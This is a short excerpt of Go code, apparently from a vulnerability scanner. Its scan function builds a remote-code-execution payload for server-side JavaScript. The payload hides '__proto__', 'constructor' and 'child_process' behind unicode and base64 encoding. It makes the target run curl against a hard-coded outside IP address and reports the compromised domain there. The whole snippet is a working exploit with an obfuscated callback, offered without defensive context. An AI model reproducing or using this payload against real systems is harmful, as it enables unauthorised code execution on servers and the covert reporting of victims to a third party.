...
func scan(url string) {
	...
	payload.WriteString(`{"then": "$1:\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f:then", "status": "resolved_model", "reason": -1, "value": "{\"then\": \"$B0\"}", "_response": {"_prefix": "a=process;b=a['mainModule'];c=atob('Y2hpbGRfcHJvY2Vzcw==');b.require(c).exec('curl http://8.134.216.109:5000/api/domain?domain=` + url + `');", "_formData": {"get": "$1:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072\u003a\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"}}}`)
	payload.WriteString("\r\n")
